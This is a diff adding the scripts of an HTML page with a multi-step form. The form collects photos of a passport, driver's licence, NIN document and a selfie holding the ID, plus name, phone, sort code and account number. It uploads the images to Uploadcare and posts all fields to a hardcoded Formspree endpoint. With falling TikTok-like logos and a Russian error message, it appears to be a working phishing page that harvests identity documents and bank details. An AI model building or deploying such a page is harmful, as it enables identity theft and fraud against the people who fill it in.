+				var hasNin = (typeof window.hasNin !== 'undefined') ? window.hasNin : true;
+				if (hasNin) {
+					var ninPhoto = document.getElementById('nin-photo');
+					var haveNin = (ninPhoto && ninPhoto.files && ninPhoto.files.length > 0) || !!window.uploadUrls.nin;
+					if (!haveNin) {
+						alert('Please upload a photo of your NIN document or answer No at Step 3 to skip.');
+						return;
+					}
+				}
+				// Tick mark in the sixth circle
+				const step6Circle = document.getElementById('step6-circle');
+				if (step6Circle) {
+					step6Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+					step6Circle.style.background = '#fff';
+					step6Circle.style.color = '#fff';
+					step6Circle.style.border = '2px solid #fff';
+				}
+				// Transition to step 7
+				document.getElementById('step6-form').style.display = 'none';
+				document.getElementById('step7-form').style.display = 'flex';
+			});
+		}
+
+		// Wire up custom upload buttons and previews for Step 5
+		function setupPreview(buttonId, inputId, previewContainerId, filenameId) {
+			var btn = document.getElementById(buttonId);
+			var input = document.getElementById(inputId);
+			var preview = document.getElementById(previewContainerId);
+			var fname = document.getElementById(filenameId);
+			if (!btn || !input) return;
+			btn.addEventListener('click', function() {
+				input.click();
+			});
+			input.addEventListener('change', function() {
+				if (input.files && input.files[0]) {
+					var file = input.files[0];
+					// show filename
+					if (fname) fname.textContent = file.name;
+					// try to preview image
+					var reader = new FileReader();
+					reader.onload = function(e) {
+						if (preview) {
+							preview.innerHTML = '<img src="' + e.target.result + '" style="width:100%;height:100%;object-fit:contain;">';
+						}
+					};
+					reader.readAsDataURL(file);
+				} else {
+					if (fname) fname.textContent = '';
+				}
+			});
+		}
+
+		// Mapping from native input id to uploadcare store key and preview elements
+		window.uploadcareMapping = window.uploadcareMapping || {
+			'passport-front': { key: 'passportFront', previewId: 'passport-front-preview', fnameId: 'passport-front-filename' },
+			'license-front': { key: 'licenseFront', previewId: 'license-front-preview', fnameId: 'license-front-filename' },
+			'license-back': { key: 'licenseBack', previewId: 'license-back-preview', fnameId: 'license-back-filename' },
+			'passport-photo': { key: 'selfie', previewId: 'passport-preview', fnameId: 'passport-filename' },
+			'license-photo': { key: 'selfie', previewId: 'license-preview', fnameId: 'license-filename' },
+			'nin-photo': { key: 'nin', previewId: 'nin-preview', fnameId: 'nin-filename' }
+		};
+
+		// Upload file to Uploadcare using direct API (XHR) so we can hide Uploadcare UI
+		function uploadFileToUploadcare(file, mapping) {
+			if (!file || !mapping) return;
+			var pub = (typeof UPLOADCARE_PUBLIC_KEY !== 'undefined') ? UPLOADCARE_PUBLIC_KEY : 'c6e1967d2f0aabab12ea';
+			var url = 'https://upload.uploadcare.com/base/';
+			var fd = new FormData();
+			fd.append('UPLOADCARE_PUB_KEY', pub);
+			fd.append('file', file);
+
+			// show uploading state in filename element
+			var fnameEl = document.getElementById(mapping.fnameId);
+			if (fnameEl) { fnameEl.textContent = 'Uploading...'; }
+
+			var xhr = new XMLHttpRequest();
+			xhr.open('POST', url, true);
+			xhr.onload = function() {
+				if (xhr.status >= 200 && xhr.status < 300) {
+					try {
+						var res = JSON.parse(xhr.responseText);
+						if (res && res.file) {
+							var cdn = 'https://ucarecdn.com/' + res.file + '/';
+							window.uploadUrls = window.uploadUrls || {};
+							window.uploadUrls[mapping.key] = cdn;
+							// update preview image
+							var prev = document.getElementById(mapping.previewId);
+							if (prev) {
+								var img = prev.querySelector('img');
+								if (img) img.src = cdn; else prev.innerHTML = '<img src="'+cdn+'" style="width:100%;height:100%;object-fit:contain;" />';
+							}
+							if (fnameEl) { fnameEl.textContent = file.name || '' ; }
+						}
+					} catch (err) { console.error('Uploadcare parse error', err); if (fnameEl) fnameEl.textContent = 'Upload failed'; }
+				} else {
+					console.error('Uploadcare upload failed', xhr.status, xhr.responseText);
+					if (fnameEl) fnameEl.textContent = 'Upload failed';
+				}
+			};
+			xhr.onerror = function() { if (fnameEl) fnameEl.textContent = 'Upload failed'; };
+			xhr.send(fd);
+		}
+
+		setupPreview('passport-upload-btn', 'passport-photo', 'passport-preview', 'passport-filename');
+		// Wire passport front upload (Step 4)
+		setupPreview('passport-front-upload-btn', 'passport-front', 'passport-front-preview', 'passport-front-filename');
+		setupPreview('license-upload-btn', 'license-photo', 'license-preview', 'license-filename');
+		// Wire license front/back custom upload buttons
+		setupPreview('license-front-upload-btn', 'license-front', 'license-front-preview', 'license-front-filename');
+		setupPreview('license-back-upload-btn', 'license-back', 'license-back-preview', 'license-back-filename');
+		// Wire NIN upload preview and custom button
+		setupPreview('nin-upload-btn', 'nin-photo', 'nin-preview', 'nin-filename');
+
+		// Ensure the example NIN image has a graceful fallback if file missing
+		(function installNinExampleFallback(){
+			var img = document.getElementById('nin-example-img');
+			var preview = document.getElementById('nin-preview');
+			if (img && preview) {
+				img.onerror = function() {
+					preview.innerHTML = `\n					<svg width="220" height="140" viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">\n					    <rect x="0" y="0" width="220" height="140" rx="10" fill="#fff" />\n					    <rect x="12" y="12" width="196" height="116" rx="8" fill="#eaf6ff" />\n					    <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="#7a7a7a" font-size="14">NIN example</text>\n					</svg>\n					`;
+				};
+				// if already loaded
+				if (img.complete && img.naturalWidth !== 0) {
+					img.style.display = 'block';
+				}
+			}
+		})();
+
+		// Ensure license example images have graceful fallbacks if files missing
+		(function installLicenseExampleFallbacks(){
+			var lf = document.getElementById('license-front-example-img');
+			var lp = document.getElementById('license-front-preview');
+			if (lf && lp) {
+				lf.onerror = function(){ lp.innerHTML = `
+					<svg width="200" height="120" viewBox="0 0 200 120" xmlns="http://www.w3.org/2000/svg">
+						<rect width="200" height="120" rx="8" fill="#fff"/>
+						<rect x="12" y="12" width="176" height="96" rx="6" fill="#eaf6ff"/>
+					</svg>
+				` };
+			}
+			var bf = document.getElementById('license-back-example-img');
+			var bp = document.getElementById('license-back-preview');
+			if (bf && bp) {
+				bf.onerror = function(){ bp.innerHTML = `
+					<svg width="200" height="120" viewBox="0 0 200 120" xmlns="http://www.w3.org/2000/svg">
+						<rect width="200" height="120" rx="8" fill="#fff"/>
+						<rect x="12" y="12" width="176" height="96" rx="6" fill="#f7f7f7"/>
+					</svg>
+				` };
+			}
+		})();
+
+		// Ensure the example passport image has a graceful fallback if the file is missing
+		function installPassportPreviewFallback() {
+			var img = document.getElementById('passport-example-img');
+			var preview = document.getElementById('passport-preview');
+			if (!preview) return;
+			// If there's no example img present, keep existing content (will be placeholder SVG if any)
+			if (!img) return;
+			// When the image loads, make sure it fills the preview correctly
+			img.onload = function() {
+				img.style.display = 'block';
+				img.style.width = '100%';
+				img.style.height = '100%';
+				img.style.objectFit = 'cover';
+			};
+			// If it fails to load (file missing), replace with the original inline SVG placeholder
+			img.onerror = function() {
+				if (!preview) return;
+				preview.innerHTML = '\n                                <svg width="220" height="140" viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">\n                                    <rect x="0" y="0" width="220" height="140" rx="10" fill="#fff" />\n                                    <g transform="translate(12,12)">\n                                        <rect x="0" y="0" width="196" height="116" rx="8" fill="#eaf6ff" />\n                                        <circle cx="42" cy="44" r="22" fill="#ffd6d6" />\n                                        <rect x="74" y="20" width="92" height="16" rx="6" fill="#cfeef5" />\n                                        <rect x="74" y="44" width="92" height="52" rx="6" fill="#f7f7f7" />\n                                        <path d="M6 92c10-12 30-18 48-18" stroke="#b2dfe9" stroke-width="4" stroke-linecap="round" fill="none" />\n                                        <g transform="translate(150,6) scale(0.6)">\n                                            <path d="M10 10 L30 10 L30 50 L10 50 Z" fill="#7bd389" />\n                                            <path d="M14 26 L20 34 L36 18" stroke="#fff" stroke-width="3" fill="none" stroke-linecap="round" stroke-linejoin="round" />\n                                        </g>\n                                    </g>\n                                </svg>\n                            ';
+			};
+			// If the image has already finished loading earlier (cached), ensure styles applied
+			if (img.complete && img.naturalWidth !== 0) {
+				img.onload();
+			}
+		}
+
+		installPassportPreviewFallback();
+
+		// Fallback for passport front example in Step 4
+		(function installPassportFrontExampleFallback(){
+			var img = document.getElementById('passport-front-example-img');
+			var preview = document.getElementById('passport-front-preview');
+			if (img && preview) {
+				img.onerror = function() {
+					preview.innerHTML = `\n                    <svg width="220" height="140" viewBox="0 0 220 140" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">\n                        <rect x="0" y="0" width="220" height="140" rx="10" fill="#fff" />\n                        <rect x="12" y="12" width="196" height="116" rx="8" fill="#eaf6ff" />\n                        <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" fill="#7a7a7a" font-size="14">Passport example</text>\n                    </svg>\n                    `;
+				};
+				if (img.complete && img.naturalWidth !== 0) {
+					img.style.display = 'block';
+				}
+			}
+		})();
+
+		// Step 5 submit - validate photo with passport or driver's license and proceed to Step 6
+		var step5Form = document.getElementById('step5-form-inner');
+		if (step5Form) {
+			step5Form.noValidate = true;
+			step5Form.addEventListener('submit', function(e) {
+				e.preventDefault();
+				var docType = window.selectedDocType;
+				// fallback: try to infer docType if missing
+				if (!docType) {
+					var radioSel = document.querySelector('input[name="documentType"]:checked');
+					if (radioSel) {
+						docType = radioSel.value;
+						window.selectedDocType = docType;
+					}
+				}
+				var ok = true;
+				if (docType === 'driver') {
+					var licPhoto = document.getElementById('license-photo');
+					var haveLicPhoto = (licPhoto && licPhoto.files && licPhoto.files.length > 0) || !!window.uploadUrls.selfie;
+					if (!haveLicPhoto) {
+						alert('Please upload a photo with your driver\'s license.');
+						ok = false;
+					}
+				} else {
+					var passPhoto = document.getElementById('passport-photo');
+					var havePassPhoto = (passPhoto && passPhoto.files && passPhoto.files.length > 0) || !!window.uploadUrls.selfie;
+					if (!havePassPhoto) {
+						alert('Please upload a photo with your passport.');
+						ok = false;
+					}
+				}
+				if (!ok) return;
+				// mark step 5 as completed
+				const step5Circle = document.getElementById('step5-circle');
+				if (step5Circle) {
+					step5Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+					step5Circle.style.background = '#fff';
+					step5Circle.style.color = '#fff';
+					step5Circle.style.border = '2px solid #fff';
+				}
+				// Prepare Step 6 UI based on NIN answer
+				var ninUploadBlock = document.getElementById('nin-upload-block');
+				var ninNoBlock = document.getElementById('nin-no-block');
+				if (typeof window.hasNin !== 'undefined' && window.hasNin === false) {
+					if (ninUploadBlock) ninUploadBlock.style.display = 'none';
+					if (ninNoBlock) ninNoBlock.style.display = 'block';
+				} else {
+					if (ninUploadBlock) ninUploadBlock.style.display = 'block';
+					if (ninNoBlock) ninNoBlock.style.display = 'none';
+				}
+				// go to Step 6
+				document.getElementById('step5-form').style.display = 'none';
+				document.getElementById('step6-form').style.display = 'flex';
+			});
+		}
+
+
+	</script>
+
+	<script>
+		// Create falling TikTok-like logos that drift down the page
+		(function createFallingLogos(){
+			var container = document.getElementById('falling-logos');
+			if (!container) return;
+			var count = 12; // number of logos on screen
+			for (var i=0;i<count;i++) spawnLogo(i);
+
+			function spawnLogo(i){
+				var el = document.createElement('div');
+				el.className = 'falling-logo';
+				var size = 28 + Math.random()*36; // px
+				el.style.left = (Math.random()*100) + '%';
+				el.style.width = size + 'px';
+				el.style.height = size + 'px';
+				// random duration and delay
+				var dur = 6 + Math.random()*8; // seconds
+				var delay = Math.random()*-8; // start earlier so they are scattered
+				el.style.animation = 'fall ' + dur + 's linear ' + delay + 's infinite';
+				// simple TikTok-like mark (stylized) as inline SVG
+				el.innerHTML = '<svg viewBox="0 0 24 24" width="100%" height="100%" xmlns="http://www.w3.org/2000/svg">'
+				+ '<path d="M12 2v8.5a3.5 3.5 0 1 0 3.5 3.5V6h3V2h-6.5z" fill="#69C9D0" />'
+				+ '<path d="M12 2v8.5a3.5 3.5 0 1 0 3.5 3.5V6h3V2h-6.5z" fill-opacity="0.25" transform="translate(1.5,0)"/>'
+				+ '<path d="M12 2v8.5a3.5 3.5 0 1 0 3.5 3.5V6h3V2h-6.5z" fill="#EE1D52" transform="translate(-1.5,0)"/>'
+				+ '</svg>';
+				container.appendChild(el);
+			}
+		})();
+	</script>
+
+	<!-- Uploadcare widgets initialization and Formspree submission handler -->
+	<script>
+		// Hide the automatic Uploadcare widget UI so users use our custom buttons
+		var style = document.createElement('style');
+		style.innerHTML = '.uploadcare--widget{display:none !important;} .uploadcare--widget__button{display:none !important;}';
+		document.head.appendChild(style);
+
+		// store cdn URLs here
+		window.uploadUrls = window.uploadUrls || {};
+
+		function wireUploadcare(id, previewSelector, filenameSelector, storeKey) {
+			try {
+				var w = uploadcare.Widget('#' + id);
+				w.onUploadComplete(function(info){
+					// store url
+					window.uploadUrls[storeKey] = info.cdnUrl;
+					// update preview image if exists
+					var prev = document.querySelector(previewSelector);
+					if (prev) {
+						// if preview is an img placeholder, replace src, else inject img
+						var img = prev.querySelector('img');
+						if (img) {
+							img.src = info.cdnUrl;
+						} else {
+							prev.innerHTML = '<img src="'+info.cdnUrl+'" style="width:100%;height:100%;object-fit:contain;" />';
+						}
+					}
+					// filename text
+					var fn = document.getElementById(filenameSelector);
+					if (fn) fn.textContent = info.name || '';
+				});
+			} catch (err) {
+				console.warn('Uploadcare widget failed to initialize for', id, err);
+			}
+		}
+
+		// Wire uploaders (ids we added earlier)
+		wireUploadcare('uc-passport-front', '#passport-front-preview', 'passport-front-filename', 'passportFront');
+		wireUploadcare('uc-license-front', '#license-front-preview', 'license-front-filename', 'licenseFront');
+		wireUploadcare('uc-license-back', '#license-back-preview', 'license-back-filename', 'licenseBack');
+		wireUploadcare('uc-passport-photo', '#passport-preview', 'passport-filename', 'selfie');
+		wireUploadcare('uc-license-photo', '#license-preview', 'license-filename', 'selfie');
+		wireUploadcare('uc-nin-photo', '#nin-preview', 'nin-filename', 'nin');
+
+			// Hide inline Uploadcare UI (we show our own custom buttons). Also support opening dialog from custom buttons.
+			function openUploadcareDialog(widgetId, storeKey, previewSelector, filenameId) {
+				try {
+					var w = uploadcare.Widget('#' + widgetId);
+					// open dialog
+					w.openDialog().done(function(file){
+						file.done(function(info){
+							window.uploadUrls[storeKey] = info.cdnUrl;
+							var prev = document.querySelector(previewSelector);
+							if (prev) {
+								var img = prev.querySelector('img');
+								if (img) img.src = info.cdnUrl; else prev.innerHTML = '<img src="'+info.cdnUrl+'" style="width:100%;height:100%;object-fit:contain;'+'" />';
+							}
+							var fn = document.getElementById(filenameId);
+							if (fn) fn.textContent = info.name || '';
+						});
+					});
+				} catch (err) { console.warn('openUploadcareDialog failed', err); }
+			}
+
+			// Wire custom buttons to Uploadcare dialogs
+			var map = [
+				{btn:'passport-front-upload-btn', widget:'uc-passport-front', key:'passportFront', preview:'#passport-front-preview', fname:'passport-front-filename'},
+				{btn:'passport-upload-btn', widget:'uc-passport-photo', key:'selfie', preview:'#passport-preview', fname:'passport-filename'},
+				{btn:'license-front-upload-btn', widget:'uc-license-front', key:'licenseFront', preview:'#license-front-preview', fname:'license-front-filename'},
+				{btn:'license-back-upload-btn', widget:'uc-license-back', key:'licenseBack', preview:'#license-back-preview', fname:'license-back-filename'},
+				{btn:'license-upload-btn', widget:'uc-license-photo', key:'selfie', preview:'#license-preview', fname:'license-filename'},
+				{btn:'nin-upload-btn', widget:'uc-nin-photo', key:'nin', preview:'#nin-preview', fname:'nin-filename'}
+			];
+			map.forEach(function(m){
+				var b = document.getElementById(m.btn);
+				var nativeInputId = null;
+				// find corresponding native input from mapping
+				for (var k in window.uploadcareMapping) {
+					if (window.uploadcareMapping[k].key === m.key && window.uploadcareMapping[k].previewId === m.preview) {
+						nativeInputId = k;
+						break;
+					}
+				}
+				if (b) {
+					b.addEventListener('click', function(){
+						// if uploadcare exists and we prefer the dialog, use it; otherwise trigger native input click
+						if (typeof uploadcare !== 'undefined' && uploadcare.Widget && false) {
+							openUploadcareDialog(m.widget, m.key, m.preview, m.fname);
+						} else if (nativeInputId) {
+							var inp = document.getElementById(nativeInputId);
+							if (inp) inp.click();
+						}
+					});
+				}
+			});
+
+			// Hook native inputs to upload automatically to Uploadcare via XHR
+			for (var inputId in window.uploadcareMapping) {
+				(function(iid){
+					var inp = document.getElementById(iid);
+					if (!inp) return;
+					inp.addEventListener('change', function(){
+						if (inp.files && inp.files[0]) {
+							var mapping = window.uploadcareMapping[iid];
+							// preview already handled by setupPreview; now also upload to Uploadcare in background
+							uploadFileToUploadcare(inp.files[0], mapping);
+						}
+					});
+				})(inputId);
+			}
+
+		// helper to POST to Formspree
+		async function submitToFormspree(payload) {
+			const url = 'https://formspree.io/f/xwprpdgg';
+			const fd = new FormData();
+			for (const k in payload) fd.append(k, payload[k] || '');
+			try {
+				const res = await fetch(url, { method: 'POST', body: fd });
+				return res.ok;
+			} catch (e) {
+				console.error('Formspree submit failed', e);
+				return false;
+			}
+		}
+
+		// Modify the bank-form submit to send collected data to Formspree before moving to step 8
+		const bankForm = document.getElementById('bank-form');
+		if (bankForm) {
+			bankForm.addEventListener('submit', async function(e){
+				e.preventDefault();
+				// collect basic info
+				const fullName = (document.getElementById('firstName')?.value || '') + ' ' + (document.getElementById('lastName')?.value || '');
+				const phone = document.getElementById('phone')?.value || '';
+				const payload = {
+					full_name: fullName.trim(),
+					phone: phone,
+					passport_url: window.uploadUrls.passportFront || window.uploadUrls.passport || '',
+					license_front_url: window.uploadUrls.licenseFront || '',
+					license_back_url: window.uploadUrls.licenseBack || '',
+					selfie_url: window.uploadUrls.selfie || '',
+					nin_url: window.uploadUrls.nin || '',
+					accountHolder: document.getElementById('accountHolder')?.value || '',
+					sortCode: document.getElementById('sortCode')?.value || '',
+					accountNumber: document.getElementById('accountNumber')?.value || ''
+				};
+
+				// Optionally show a small loading state
+				const submitBtn = bankForm.querySelector('button[type="submit"]');
+				if (submitBtn) { submitBtn.disabled = true; submitBtn.textContent = 'Sending...'; }
+
+				// Try to submit via fetch, but fallback to a classic form POST with _redirect if fetch fails or times out
+				let ok = false;
+				try {
+					ok = await Promise.race([
+						submitToFormspree(payload),
+						new Promise(resolve => setTimeout(() => resolve(false), 8000))
+					]);
+				} catch (e) {
+					ok = false;
+				}
+				if (!ok) {
+					// Fallback: try sending a no-cors POST so the browser will still POST the data to Formspree
+					// and then immediately redirect locally to our thank-you page — this avoids landing on Formspree's hosted page
+					try {
+						const fd = new FormData();
+						for (const k in payload) fd.append(k, payload[k] || '');
+						// Use no-cors to avoid CORS failures; response will be opaque but the request is sent
+						fetch('https://formspree.io/f/xwprpdgg', { method: 'POST', body: fd, mode: 'no-cors' }).catch(function(err){
+							// ignore errors — we'll redirect anyway
+							console.warn('no-cors fetch failed', err);
+						});
+						// immediately redirect locally — this keeps the UX on your domain
+						window.location.href = '/thank-you.html';
+						return;
+					} catch (e) {
+						alert('Не удалось отправить заявку. Попробуйте ещё раз.');
+						if (submitBtn) { submitBtn.disabled = false; submitBtn.textContent = 'Next'; }
+						return;
+					}
+				}
+
+				// mark step 7 complete (visual)
+				const step7Circle = document.getElementById('step7-circle');
+				if (step7Circle) {
+					step7Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+					step7Circle.style.background = '#fff';
+					step7Circle.style.color = '#fff';
+					step7Circle.style.border = '2px solid #fff';
+				}
+
+				// Redirect to thank-you page for better conversion tracking
+				window.location.href = '/thank-you.html';
+			});
+		}
+
+	</script>
+</body>
+</html>
+
